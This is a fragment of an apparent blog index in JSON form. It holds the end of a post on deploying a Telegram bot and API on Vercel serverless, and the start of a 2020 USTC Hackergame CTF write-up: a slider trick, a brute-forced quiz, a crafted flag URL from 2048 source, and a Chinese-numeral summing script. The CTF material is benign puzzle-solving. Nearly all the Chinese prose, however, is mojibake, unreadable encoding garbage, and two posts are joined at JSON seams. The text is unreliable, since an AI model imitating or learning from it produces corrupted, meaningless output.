ä¸ªäººç‰ˆæœ¬æ˜¯æ°¸è¿œå…è´¹çš„ï¼å¹³å°é™åˆ¶ ä¹Ÿå¾ˆå®½è£•ã€‚ æ›´å¤šä»‹ç»è¯¦è§ å®˜æ–¹ä»‹ç»æ–‡æ¡£ã€‚ Vercel å°±æ˜¯ä»¥å‰çš„ ZEITï¼Œå…¶å‘½ä»¤è¡Œå·¥å…·å°±æ˜¯ vercelï¼Œä»¥å‰æ˜¯ nowã€‚ é¦–å…ˆæˆ‘ä»¬å®‰è£…å‘½ä»¤è¡Œå·¥å…·ã€‚ npm i -g vercel çœ‹ä¸€ä¸‹ç‰ˆæœ¬ã€‚ $ vercel --version Vercel CLI 20.1.4 20.1.4 åˆæ¬¡ä½¿ç”¨éœ€è¦ç™»å½•ï¼Œè¾“å…¥é‚®ç®±ï¼Œè€Œåç‚¹å‡»é‚®ä»¶é‡Œçš„é“¾æ¥è¿›è¡Œæˆæƒã€‚ vercel login è‹¥ç›´æ¥éƒ¨ç½²å½“å‰æ–‡ä»¶å¤¹ï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œè¾“å…¥ vercel è€ŒåæŒ‰ç…§æç¤ºè¿›è¡Œæ“ä½œå³å¯ã€‚ å…¶ä¸­ä¼šè¯¢é—®ä½ é¡¹ç›®åç§°ï¼Œé¦–æ¬¡éƒ¨ç½²æ—¶ä¼šä»¥æ­¤ç»™ä½ åˆ†é…ä¸€ä¸ª *.vercel.app ä¹‹ç±»çš„å…è´¹åŸŸåï¼Œè¿™ä¸ªå¯¹åº”ç€ç”Ÿäº§ç¯å¢ƒã€‚è€Œ *.&lt;username&gt;.vercel.app åˆ™å¯¹åº”ç€ é¢„è§ˆç¯å¢ƒ/å¼€å‘ç¯å¢ƒ (preview)ã€‚ ä¹‹åçš„æ¯ä¸€æ¬¡éƒ¨ç½²éƒ½ä¼šéƒ¨ç½²åˆ° Preview ç¯å¢ƒï¼Œç¡®å®šæ²¡é—®é¢˜åå†ç”¨ä¸‹é¢çš„å‘½ä»¤éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒå³å¯ã€‚ vercel --prod ä¸¤ä¸ªç¯å¢ƒåˆ†ç¦»å¼€æ¥å°±å¾ˆå¥½ç”¨ï¼Œèµä¸€ä¸ªã€‚ å½“ç„¶ Vercel è¿˜æ”¯æŒç»‘å®šè‡ªå·±çš„åŸŸåï¼Œåªéœ€è¦æ”¹ä¸€æ”¹ CNAME å°±å¥½ï¼Œè¿˜èƒ½è‡ªåŠ¨å¸®ä½ é…ä¸Š Letâ€™s encrypt! çš„è¯ä¹¦ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨ Settings ä¸‹çš„ Tokens é‡Œæ–°å»ºä¸€ä¸ª tokenï¼Œåˆ©ç”¨å…¶æ¥è¿›è¡Œéƒ¨ç½²ã€‚ vercel -t &lt;TOKEN Here&gt; è¿™ä¸€æ“ä½œå¾ˆé€‚åˆåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä»¥åŠå¯ä»¥ç™½å«– CI è¿›è¡Œéƒ¨ç½²ã€‚ ï¼ˆå˜¿å˜¿ï¼Œå¯ä»¥åœ¨ Organization é‡Œè¿›è¡Œæ„å»ºäº† æ›´å¤š CLI ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒ å®˜æ–¹ CLI Referenceã€‚ Serverless éƒ¨ç½²ä¸‹é¢å°±åˆ°äº†æ„‰å¿«çš„ Serverless éƒ¨ç½²ç¯èŠ‚äº†ã€‚ å‚è€ƒ Serverless Functions å®˜æ–¹æ–‡æ¡£ï¼Œæˆ‘ä»¬éœ€è¦æ–°å»ºä¸€ä¸ª api æ–‡ä»¶å¤¹ï¼Œåœ¨é‡Œé¢æ”¾æˆ‘ä»¬çš„ä»£ç ã€‚ ç›®å‰æ”¯æŒçš„åç«¯è¯­è¨€åŒ…æ‹¬ï¼š Node.js Go Python Ruby æˆ‘è¿™é‡Œä½¿ç”¨çš„æ„Ÿè§‰çš„è¯ï¼ŒJSæ”¯æŒæœ€å¥½ï¼Œæ¯•ç«Ÿè‡ªå®¶æœ‰ Next.jsã€‚ è€Œ Python çš„è¯å…¶å®æ”¯æŒå¹¶æ²¡æœ‰é‚£ä¹ˆå¥½ï¼Œäºæ˜¯å°±é‡åˆ°äº†ä¸€äº›é—®é¢˜ã€‚ã€‚ Python files within the api directory, containing an handler variable that inherits from the BaseHTTPRequestHandler class or an app variable that exposes a WSGI or ASGI application, will be served as Serverless Functions. æ¯”å¦‚è·¯ç”±é—®é¢˜ï¼Œå®ƒé»˜è®¤æ˜¯ä¸€ä¸ªæ–‡ä»¶å¯¹åº”ä¸€ä¸ªè·¯ç”±ï¼Œå³å…¶æ–‡ä»¶åå°±æ˜¯å…¶è·¯ç”±ã€‚ ä½†è¿™ä¸åˆé€‚ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯åœ¨ä¸€ä¸ª py æ–‡ä»¶é‡Œé€šè¿‡ Flask æ¥å¤„ç†è·¯ç”±ï¼Œæš´éœ²ä¸€ä¸ª app å¯¹è±¡ã€‚äºæ˜¯éœ€è¦è‡ªå·±é…ç½®ä¸€ä¸‹ã€‚ åœ¨ api å¤–é¢çš„ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª vercel.json æ–‡ä»¶ï¼Œåœ¨é‡Œé¢è¿›è¡Œé…ç½®ã€‚ å‚è€ƒ Configuration Referenceï¼Œæˆ‘è¿™é‡ŒæŠŠ /api(.*) éƒ½äº¤ç»™ api/main.py æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œè¿™æ ·å°±èƒ½è§£å†³è·¯ç”±é—®é¢˜ã€‚ { \"version\": 2, \"routes\": [{ \"headers\": { \"Access-Control-Allow-Origin\": \"*\" }, \"src\": \"/api(.*)\", \"dest\": \"api/main.py\", \"continue\": true }] } åŒæ—¶è¦æ³¨æ„çš„æ˜¯ï¼Œmain.py é‡Œçš„è·¯ç”±ä¹Ÿéœ€è¦åŒ…å« /apiï¼Œä¾‹å¦‚ @app.route('/api/calc', methods=['GET', 'POST']) def api_calc(): \"\"\" Calculate 114514 API \"\"\" pass 0x05 éƒ¨ç½² Telegram botTelegram bot æ‰æ˜¯è¿™æ¬¡çš„é‡ç‚¹å§ã€‚ ç”±äº Telegram ç»™æˆ‘ä»¬æä¾›äº† Webhook è¿™ç§å¤„ç†æ¶ˆæ¯çš„æ–¹å¼ï¼Œå½“ bot æ¥æ”¶åˆ°ç”¨æˆ·å‘æ¥çš„æ¶ˆæ¯åï¼ŒTelegram æœåŠ¡å™¨ä¼šç»™ä½ è®¾ç½® Webhook çš„ URI å‘ä¸€ä¸ª POST è¯·æ±‚ï¼Œå¯¹è¿™ä¸ªåŒ…è¿›è¡Œè§£æå°±èƒ½å¾—åˆ°ç”¨æˆ·çš„æ¶ˆæ¯ç­‰ä¿¡æ¯ã€‚è¿›è€Œå¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå†é€šè¿‡ TG bot çš„ API ç»™ç”¨æˆ·å›å¤æ¶ˆæ¯å°±å®Œäº‹äº†ã€‚ é¦–å…ˆéœ€è¦è®¾ç½®å¥½ Webhook åˆ° Vercel çš„ URI ä¸Šï¼Œåˆ©ç”¨ Flask çš„è·¯ç”±å»æ¥æ”¶ã€‚è¿™é‡Œç•¥äº†ã€‚ è€Œå¤„ç†æ¶ˆæ¯çš„éƒ¨åˆ†ï¼Œåœ¨å†™çš„æ—¶å€™æœ€å¼€å§‹æ˜¯æƒ³è‡ªå·±å†™çš„ï¼Œæ¯•ç«Ÿå¹¶ä¸å¤æ‚ï¼Œå®ƒé€æ¥çš„æ˜¯ä¸ª JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæå–ä¸€ä¸‹å°±å®Œäº‹äº†ã€‚ ä½†æ˜¯ä¸»è¦æƒ³å®ç°ä¸€ä¸ªå†…è”æŸ¥è¯¢ï¼ˆinline queryï¼‰çš„åŠŸèƒ½ï¼ŒåŒæ—¶è¿˜è¦å…¼é¡¾æ¶ˆæ¯å›å¤ï¼Œå°±è§‰å¾—æœ‰ç‚¹éº»çƒ¦ï¼Œè¿˜ä¸å¦‚ç”¨ç°æˆçš„è½®å­ï¼Œæ‡’å¾—é€ è½®å­äº†ã€‚ å» GitHub ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸¤å¤§ç°æˆè½®å­ï¼š**python-telegram-bot** åŠ **pyTelegramBotAPI**ã€‚ ä»–ä»¬çš„æ–‡æ¡£éƒ½æŒºä¸°å¯Œçš„ï¼Œä¹Ÿæœ‰å¾ˆå¤šä¾‹å­ã€‚ä¸»è¦å°±æ˜¯å¯¹å®˜æ–¹çš„ HTTP API æ¥å£è¿›è¡Œäº†å°è£…ï¼Œå¤„ç†æ¶ˆæ¯ä¸Šå¥½åƒè¿˜åšäº†ä¸ªé˜Ÿåˆ—ï¼Œç”¨äº†å¼‚æ­¥å®ç°çš„æ„Ÿè§‰ã€‚ ï¼ˆu1s1ï¼Œé‚£æ—¶æˆ‘ä¸€åº¦æœ‰ è¿˜ä¸å¦‚è‡ªå·±å†™ çš„æ„Ÿè§‰ å…¶ä¸­å‰è€…æœ¬èº«å¸¦æœ‰ä¸€ä¸ª webhook æœåŠ¡å™¨ï¼Œä½†è¯•äº†å‘ç°ä¸ç¬¦åˆ Vercel çš„è¦æ±‚ï¼Œæ²¡æœ‰æš´éœ² app å¯¹è±¡ä¹‹ç±»çš„ï¼Œäºæ˜¯è·‘ä¸èµ·æ¥ã€‚ åè€…åˆ™æä¾›äº†ä¸€ä¸ª webhook heroku éƒ¨ç½²çš„æ ·ä¾‹ï¼Œå³ pyTelegramBotAPI/examples/webhook_examples/webhook_flask_heroku_echo.py å…³é”®ä»£ç ï¼š @server.route('/' + TOKEN, methods=['POST']) def getMessage(): bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode(\"utf-8\"))]) return \"!\", 200 process_new_updates è¿™ä¸ªæ–¹æ³•èƒ½æŠŠæ¥æ”¶åˆ°çš„ä¿¡æ¯ä¼ è¿›å»ï¼Œä»è€Œå»ºç«‹äº† Webhook å’Œ pyTelegramBotAPI çš„è”ç³»ã€‚ äºæ˜¯å°±ç”¨ pyTelegramBotAPI è¿™ä¸ªæ¥å®ç°äº†ã€‚ è¿˜æœ‰ä¸€ä¸ªå‘å°±æ˜¯ï¼Œå¯èƒ½æ˜¯ç”±äºå¼‚æ­¥å¤„ç†æ¶ˆæ¯çš„åŸå› ï¼ŒVercel Serverless ä¸­çš„ process_new_updates ç»“æŸ return ä¹‹åè¿™ä¸ªä¼šè¯å°±å…³é—­äº†ï¼Œæ¶ˆæ¯è¿˜æ¥ä¸åŠå¤„ç†å®Œå›é€ç»™ Telegramã€‚åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ç»å¸¸å°±æ¶ˆæ¯è«åå…¶å¦™ä¸¢å¤±äº†ï¼Œæˆ–è€…è¿ç€å‘å‡ æ¡æ¶ˆæ¯æ‰å›å¤çš„æƒ…å†µã€‚ åæ¥å°è¯•äº†åŠ ä¸€ä¸ª bot.get_me() æ¥ç¼“è§£ã€‚ å†åæ¥ï¼Œå‘ç°ç›´æ¥åŠ ä¸ªå»¶æ—¶å°±å®Œäº‹äº†ï¼Œtime.sleep(0.5)ï¼Œåªéœ€è¦ 0.5s å»¶æ—¶ï¼Œç®€å•ç²—æš´è§£å†³é—®é¢˜ã€‚ ï¼ˆå–µå–µ~ ç›¸å…³ä»£ç ä½äº GitHub repo https://github.com/miaotony/calc114514 çš„ /api/ ç›®å½•ä¸‹ï¼Œmain.py å†…åŒ…å«äº†å¼€æ”¾æ¥å£å’Œ bot äº¤äº’çš„ç›¸å…³æ¥å£ã€‚ å¼€å‘è¯´æ˜ Install the requirements. å®‰è£…ä¾èµ–ã€‚ pip3 install -r requirements.txt Edit your Telegram bot token and Webhook URL path in the secret.example.py. è¿™é‡Œæˆ‘æŠŠå…³é”®é…ç½®ä¸“é—¨æ‹¿å‡ºæ¥æ”¾åˆ° secret.example.py æ–‡ä»¶é‡Œäº†ï¼Œå¼€å‘çš„æ—¶å€™è¦ä¿®æ”¹æˆä½ çš„ã€‚ Rename secret.example.py to secret.py. æ”¹åã€‚ Run the backend, for example, gunicorn main:app. è¿è¡Œåç«¯ç¨‹åºã€‚ åŸºäº Vercel éƒ¨ç½²ï¼š åœ¨é…ç½®å¥½ vercel.json å’Œ api ç›®å½•çš„åŸºç¡€ä¸Šï¼Œç›´æ¥ç”¨ CLI ä¸Šä¼ å³å¯ã€‚ vercel 0x06 FrontEnd å‰ç«¯æœ€åï¼Œå¯»æ€ç€å’± API éƒ½å¼„å¥½äº†ï¼Œä¸å¦‚å†æ•´ä¸ªå‰ç«¯ç•Œé¢å§ã€‚ ç”±äºé‡‡ç”¨äº†å‰åç«¯åˆ†ç¦»æ¶æ„ï¼Œç›´æ¥è°ƒç”¨ä¹‹å‰å†™çš„ API å°±å¥½äº†ã€‚ æƒ³åˆ° Hackergame 2020 ç­¾åˆ°é¢˜é‚£ä¸ªç•Œé¢å°±ä¸é”™ï¼Œäºæ˜¯åœ¨æ­¤åŸºç¡€ä¸Šé­”æ”¹äº†ä¸€ä¸‹ï¼ŒåŠ äº†ä¸ª AJAX ç½‘ç»œè¯·æ±‚ï¼Œé¡ºä¾¿åšäº†ä¸ªè¾“å…¥æ¡†å’Œæ»‘å—çš„åŒå‘æ•°æ®ç»‘å®šã€‚ å‰ç«¯æœ¬èº«å°±æ˜¯é™æ€æ–‡ä»¶äº†ï¼Œç›´æ¥æ‰”æ ¹ç›®å½•ä¸‹ï¼ŒåŸºäº Vercel éƒ¨ç½²å°±å®Œäº‹äº†ã€‚ è¯¦è§ï¼š https://calc114514.vercel.app/ BTW, å½“ä½ æƒ³è¦è®ºè¯ 114514 çš„æ—¶å€™ä¼šç»™ä½ å¤šæç¤ºä¸ªâ€œæ¶è‡­çš„â€ ï¼ˆå˜»å˜» 0x07 Summary å°ç»“æ€»ä¹‹å°±æ˜¯å†™äº†ä¸€å¤§ç‰ˆï¼Œä»è®ºè¯ç®—æ³•åˆ°æ¥å£éƒ¨ç½²åˆ° Telegram bot éƒ¨ç½²å†åˆ°å‰ç«¯ç•Œé¢ï¼ŒæŠŠæ•´ä¸ªå®ç°çš„è¿‡ç¨‹è¯´äº†ä¸€é€šã€‚ å‰ç«¯ï¼šhttps://calc114514.vercel.app/ Telegram bot: @calc114514bot. ä»£ç å¼€æºåœ¨ GitHub ä¸Šï¼šhttps://github.com/miaotony/calc114514 èµ°è¿‡è·¯è¿‡ç‚¹ä¸ª STAR å§~ ï¼ˆServerless çœŸé¦™ï¼ å½“ç„¶æœ€åè¿˜æ˜¯æä¸€å¥â€”â€” æœ¬æ–‡ç›¸å…³å†…å®¹ä»…ä¾›å­¦ä¹ ç ”ç©¶ä½¿ç”¨ï¼Œè¯·åœ¨åˆç†åˆæ³•èŒƒå›´å†…ä½¿ç”¨ï¼Œè¯·å‹¿æ»¥ç”¨ï¼ 0xFF Extensive ReadingV2EX: åŸºäº Vercel æä¾›çš„ Serverless å†™çš„æœåŠ¡ vercel æ— æœåŠ¡éƒ¨ç½² Go å‡½æ•° å¦‚ä½•å…è´¹ä¸ºä½ çš„ç»„ç»‡é¡¹ç›®é…ç½® Vercel ï¼ˆè¿™ä¸ªå°±æ˜¯ç”¨åˆ°äº†ä¸Šé¢æ‰€è¯´çš„ Tokenï¼‰ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2020/11/18/Server_Vercel_Calc114514/"},{"title":"CTF | 2020 USTC Hackergame WriteUp","text":"å‰è¨€ä¸€å¹´ä¸€åº¦çš„ USTC Hackergame åˆæ¥äº†ã€‚ ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬ä¸ƒå±Šä¿¡æ¯å®‰å…¨å¤§èµ› æ¯”èµ›å¹³å°ï¼šhttps://hack.lug.ustc.edu.cn/ å®˜æ–¹ WriteUp &amp; é¢˜ç›®å­˜æ¡£ï¼šhttps://github.com/USTC-Hackergame/hackergame2020-writeups æ­£å¥½è¿™å‘¨äº‹æƒ…ä¸æ˜¯å¾ˆå¤šï¼Œæœ‰æœºä¼šæ¥æ‰“ä¸€æ‰“ç©ä¸€ç©ã€‚ ç”±äºæ€•æ¯”èµ›ç»“æŸå†å†™æˆ‘ä¼šå’•å’•å’•ï¼Œäºæ˜¯å°±è¾¹åšé¢˜è¾¹å†™ WriteUp äº†ã€‚ æ¯”èµ›ç»“æŸä¹‹ååˆå¤ç°äº†å‡ é“è¢«å¡ä½çš„é¢˜è¿™æ ·ã€‚ ï¼ˆè¿™ç¯‡ç‰¹åˆ«é•¿ç‰¹åˆ«é•¿ç‰¹åˆ«é•¿â€¦â€¦ ç­¾åˆ°FLAG æå–å™¨ è¿˜è¡Œã€‚ ï¼ˆå°±æ˜¯ä¸æƒ³ç»™ä½ 1ä¸ª flag å§ 233 var prevVal = 0; $(document).ready(function() { $(\"#show\").text($('#number')[0].value); $('#number').on('input', function() { if ($('#number')[0].value.toString() === \"1\") { console.log('æ²¡æƒ³åˆ°å§!'); $('#number')[0].value = 1.00001; if (prevVal == 1.00001) $('#number')[0].value = 0.99999; if (prevVal == 0.99999) $('#number')[0].value = 1.00001; } $(\"#show\").text($('#number')[0].value.toString()); prevVal = $('#number')[0].value; }); }); ç›´æ¥æ”¹ url å°±å®Œäº‹äº†ã€‚ çŒ«å’ªé—®ç­”++ ä»¥ä¸‹ç¼–ç¨‹è¯­è¨€ã€è½¯ä»¶æˆ–ç»„ç»‡å¯¹åº”æ ‡å¿—æ˜¯å“ºä¹³åŠ¨ç‰©çš„æœ‰å‡ ä¸ªï¼ŸDockerï¼ŒGolangï¼ŒPythonï¼ŒPlan 9ï¼ŒPHPï¼ŒGNUï¼ŒLLVMï¼ŒSwiftï¼ŒPerlï¼ŒGitHubï¼ŒTortoiseSVNï¼ŒFireFoxï¼ŒMySQLï¼ŒPostgreSQLï¼ŒMariaDBï¼ŒLinuxï¼ŒOpenBSDï¼ŒFreeDOSï¼ŒApache Tomcatï¼ŒSquidï¼ŒopenSUSEï¼ŒKaliï¼ŒXfce.æç¤ºï¼šå­¦æœ¯ä¸Šä¸€èˆ¬è®¤ä¸ºé¾™ä¸å±äºå“ºä¹³åŠ¨ç‰©ã€‚ â€¦â€¦ ä¸æ‰¾äº†ï¼ˆæ‡’ æœ€åç›´æ¥ç©·ä¸¾äº†ï¼Œæœ‰ 12 ä¸ªã€‚ï¼ˆè¯¦è§åé¢ï¼‰ ç¬¬ä¸€ä¸ªä»¥ä¿¡é¸½ä¸ºè½½ä½“çš„ IP ç½‘ç»œæ ‡å‡†çš„ RFC æ–‡æ¡£ä¸­æ¨èä½¿ç”¨çš„ MTU (Maximum Transmission Unit) æ˜¯å¤šå°‘æ¯«å…‹ï¼Ÿæç¤ºï¼šå’•å’•å’•ï¼Œå’•å’•å’•ã€‚ è¿™ä¸ªé¢˜çœŸçš„æœ‰æ„æ€ã€‚æœ€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯å¾ˆå¸¸è§çš„ 1500 bytesï¼Œæˆ–è€… PPPOE çš„1492bytesï¼Œä½†éƒ½ä¸å¯¹ã€‚ äºæ˜¯çœŸå°±å»æ‰¾äº†ï¼Œæ²¡æƒ³åˆ°çœŸæœ‰ç¦½ç±»ä½œä¸ºæ ‡å‡†è¿™ä¸€è¯´ã€‚ ç™¾åº¦ç™¾ç§‘ï¼šä¿¡é¸½IPé€šè®¯ â€œç¦½ç±»ä½œä¸ºè½½ä½“ä¼ è¾“IPæ•°æ®åŒ…æ ‡å‡†â€ è¯¦è§ RFC 1149 - Standard for the transmission of IP datagrams on aviaã€‚ å¾—åˆ°å…¶ MTU ä¸º 256 æ¯«å…‹ã€‚ç»äº†ï¼ BTW, é¡ºä¾¿æŸ¥åˆ°äº† å¸¸è§çš„ MTU æ ‡å‡†ã€‚ è¯¦è§ RFC 1191: Path MTU Discoveryã€‚ USTC Linux ç”¨æˆ·åä¼šåœ¨ 2019 å¹´ 9 æœˆ 21 æ—¥è‡ªç”±è½¯ä»¶æ—¥æ´»åŠ¨ä¸­ä»‹ç»çš„å¼€æºæ¸¸æˆçš„åç§°å…±æœ‰å‡ ä¸ªå­—æ¯ï¼Ÿæç¤ºï¼šæ´»åŠ¨è®°å½•ä¼šåœ¨å“ªé‡Œï¼Ÿ https://lug.ustc.edu.cn/wiki/lug/events/ https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/slides/%E9%97%AA%E7%94%B5%E6%BC%94%E8%AE%B2/Teeworlds/teeworlds.pdf TEEWORLDS 9 ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿æ ¡åŒºå›¾ä¹¦é¦†æ­£å‰æ–¹ï¼ˆè¥¿å—æ–¹å‘ï¼‰ 50 ç±³ L å‹çŒæœ¨å¤„å…±æœ‰å‡ ä¸ªè¿é€šçš„åˆ’çº¿åœè½¦ä½ï¼Ÿæç¤ºï¼šå»ºè®®èº«ä¸´å…¶å¢ƒã€‚ ç™¾åº¦å®æ™¯åœ°å›¾ å¥½å•Šï¼ 9 ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬å…­å±Šä¿¡æ¯å®‰å…¨å¤§èµ›æ‰€æœ‰äººåˆè®¡æäº¤äº†å¤šå°‘æ¬¡ flagï¼Ÿæç¤ºï¼šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚ å‚è€ƒ https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/ ç»ç»Ÿè®¡ï¼Œåœ¨æœ¬æ¬¡æ¯”èµ›ä¸­ï¼Œæ€»å…±æœ‰ 2682 äººæ³¨å†Œï¼Œ1904 äººè‡³å°‘å®Œæˆäº†ä¸€é¢˜ã€‚æ¯”èµ›æœŸé—´æ‰€æœ‰äººåˆè®¡æäº¤äº† 17098 æ¬¡ flagï¼Œå…¶ä¸­çº¦ 57.44% ä¸ºæ­£ç¡®çš„æäº¤ã€‚ 17098 æŠ“äº†ä¸ªåŒ…æ‹¿å» Burp Suite æš´åŠ›è§£ç¬¬ä¸€é¢˜ç­”æ¡ˆï¼ˆå¤§é›¾ æœ€åå¾—åˆ° flagã€‚ 2048å¥½ä¸€ä¸ªç¿»ç‰ˆçš„2048ï¼Œç„¶è€ŒçœŸæ­£è¦åˆ° 2^14 æ‰è¡Œï¼ˆ ç©äº†å‡ å±€å‘ç°ç©ä¸ä¸‹å»äº†ï¼Œç›´æ¥çœ‹æºç å¥½äº†å§ã€‚ å…³é”®çš„æºç åœ¨ html_actuator.js æœ€åè¿™ä¸€æ®µã€‚ HTMLActuator.prototype.message = function (won) { var type = won ? \"game-won\" : \"game-over\"; var message = won ? \"FLXG å¤§æˆåŠŸï¼\" : \"FLXG æ°¸ä¸æ”¾å¼ƒï¼\"; var url; if (won) { url = \"/getflxg?my_favorite_fruit=\" + ('b'+'a'+ +'a'+'a').toLowerCase(); } else { url = \"/getflxg?my_favorite_fruit=\"; } let request = new XMLHttpRequest(); request.open('GET', url); request.responseType = 'text'; request.onload = function() { document.getElementById(\"game-message-extra\").innerHTML = request.response; }; å…¶ä¸­ NaN æ‹¼æ¥å¯è¿˜è¡Œï¼ŒJS çœŸå¥‡å¦™ã€‚ äºæ˜¯æ„é€ è¯·æ±‚ http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana å³å¯æ‹¿åˆ° flag äº†ï¼ ä¸€é—ªè€Œè¿‡çš„ Flagåœ¨å‘½ä»¤è¡Œé‡Œæ‰“å¼€å°±å®Œäº‹äº†ã€‚ ä»é›¶å¼€å§‹çš„è®°è´¦å·¥å…·äºº å¦‚åŒå¾€å¸¸ä¸€æ ·ï¼Œä½ çš„ npy çªç„¶ä¸¢ç»™ä½ ä¸€ä¸ªè´­ç‰©è´¦å•ï¼šâ€œæˆ‘ä»Šå¤©ä¹°äº†å‡ ä¸ªå°ç©æ„ï¼Œä½ èƒ½å¸®æˆ‘ç®—ä¸€ä¸‹ä¸€å…±èŠ±äº†å¤šå°‘é’±å—ï¼Ÿâ€ ä½ å¿ƒæƒ³ï¼šåˆåŒå’å•è¦å¼€å§‹åƒåœŸäº† è¿™ä¸æ˜¯å¾ˆç®€å•å—ï¼Ÿç”µå­è¡¨æ ¼é‡Œé¢ä¸€æ‹–åŠ¨å°±ç®—å‡ºæ¥äº† åªä¸è¿‡æ‹¿åˆ°è´¦å•ä¹‹åä½ æ‰æ³¨æ„åˆ°ï¼Œä¼¼ä¹æ˜¯ä¸ºäº†å‰æ‰‹æ—¶æ›´åŠ çš„å®‰å¿ƒï¼Œè¿™æ¬¡çš„è´¦å•ä¸Šé¢çš„é‡‘é¢å…¨ä½¿ç”¨äº†ä¸­æ–‡å¤§å†™æ•°å­— æ³¨æ„ï¼šè¯·å°†è´¦å•æ€»é‡‘é¢ä¿ç•™å°æ•°ç‚¹åä¸¤ä½ï¼Œæ”¾åœ¨ flag{} ä¸­æäº¤ï¼Œä¾‹å¦‚æ€»é‡‘é¢ä¸º 123.45 å…ƒæ—¶ï¼Œä½ éœ€è¦æäº¤ flag{123.45} å‘ç°æ˜¯ä¸ª excelã€‚ æ€»å…±æœ‰1000è¡Œæ•°æ®ï¼Œæœ¬æ¥æƒ³åœ¨é‡Œé¢ç›´æ¥è½¬æ¢çš„ï¼Œä½†è¯•äº†ä¸€ä¸‹å‘ç°æ²¡æ‰¾åˆ°è‡ªå¸¦çš„å·¥å…·ï¼Œäºæ˜¯ç”¨ Python å†™ä¸ªè„šæœ¬ç®—ç®—å¥½äº†ã€‚ é¦–å…ˆç”¨æ­£åˆ™åŒ¹é…å…ˆæŠŠå…ƒã€è§’ã€åˆ†ç»™æå–å‡ºæ¥ï¼Œç„¶åå†™ä¸ªå­—å…¸è½¬æ¢å°±å¥½äº†ã€‚ è¿™é‡Œçš„è½¬æ¢å‚è€ƒäº† Python ä¸­æ–‡(å¤§å†™)æ•°å­—è½¬é˜¿æ‹‰ä¼¯æ•°å­—ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šç»“åˆè¿™é¢˜æ”¹äº†æ”¹ä»£ç ã€‚ å¦å¤–è€ƒè™‘åˆ°æµ®ç‚¹è¿ç®—å¯èƒ½å¸¦æ¥çš„ç²¾åº¦é—®é¢˜ï¼Œå…ƒã€è§’ã€åˆ†å•ç‹¬ç»Ÿè®¡ï¼Œæœ€åè¿›è¡Œåˆå¹¶ã€‚ # -*- coding: utf-8 -*- \"\"\" Hackergame 2020 ä»é›¶å¼€å§‹çš„è®°è´¦å·¥å…·äºº @Author: MiaoTony @Time: 20201031 \"\"\" # constants for chinese_to_arabic CN_NUM = { 'ã€‡': 0, 'ä¸€': 1, 'äºŒ': 2, 'ä¸‰': 3, 'å››': 4, 'äº”': 5, 'å…­': 6, 'ä¸ƒ': 7, 'å…«': 8, 'ä¹': 9, 'é›¶': 0, 'å£¹': 1, 'è´°': 2, 'å': 3, 'è‚†': 4, 'ä¼': 5, 'é™†': 6, 'æŸ’': 7, 'æŒ': 8, 'ç–': 9, 'è²®': 2, 'ä¸¤': 2, } CN_UNIT = { 'å': 10, 'æ‹¾': 10, 'ç™¾': 100, 'ä½°': 100, 'åƒ': 1000, 'ä»Ÿ': 1000, 'ä¸‡': 10000, 'è¬': 10000, 'äº¿': 100000000, 'å„„': 100000000, 'å…†': 1000000000000, } def chinese_to_arabic(cn: str) -&gt; int: unit = 0 # current ldig = [] # digest for cndig in reversed(cn): if cndig in CN_UNIT: unit = CN_UNIT.get(cndig) if unit == 10000 or unit == 100000000: ldig.append(unit) unit = 1 else: dig = CN_NUM.get(cndig) if unit: dig *= unit unit = 0 ldig.append(dig) if unit == 10: ldig.append(10) val, tmp = 0, 0 for x in reversed(ldig): if x == 10000 or x == 100000000: val += tmp * x tmp = 0 else: tmp += x val += tmp return val if __name__ == '__main__': s = \"\"\"è´°æ‹¾å…ƒé™†è§’ä¼åˆ† 1 å£¹å…ƒå£¹è§’è´°åˆ† 4 æ‹¾æŒå…ƒä¼è§’å£¹åˆ† 1 ... \"\"\" l = s.split('\\n') # print(len(l)) re_split = re.compile(r'(.*å…ƒ)?(.*è§’)?(.*åˆ†)?') total_yuan = 0 total_jiao = 0 total_fen = 0 for row in l: yuan_int = 0 jiao_int = 0 fen_int = 0 print(row) money = row.split('\\t')[0] count = row.split('\\t')[1] count_int = int(count) money_group = re_split.search(money) if money_group.group(1): yuan = money_group.group(1)[:-1] yuan_int = chinese_to_arabic(yuan) if money_group.group(2): jiao = money_group.group(2)[:-1] jiao_int = chinese_to_arabic(jiao) if money_group.group(3): fen = money_group.group(3)[:-1] fen_int = chinese_to_arabic(fen) print(yuan_int, jiao_int, fen_int) total_yuan += yuan_int * count_int total_jiao += jiao_int * count_int total_fen += fen_int * count_int total = total_yuan + total_jiao * 0.1 + total_fen * 0.01 print(\"total:\", total) æ‰€ä»¥å°±æ˜¯ flag{20132.81} åé¢æ‰çŸ¥é“ï¼Œè¿™é¢˜å±…ç„¶æ˜¯åŠ¨æ€ flagï¼Œä¹Ÿå°±æ˜¯è¯´åŠ¨æ€ç”Ÿæˆçš„æ–‡ä»¶ã€‚å‡ºé¢˜å¸ˆå‚…ä»¬å¤ªå¼ºäº†ï¼ BTWï¼Œè¿˜å‘ç°äº†ä¸€ä¸ªå¥½ç”¨çš„åº“ **cn2an**ã€‚ ğŸ“¦ 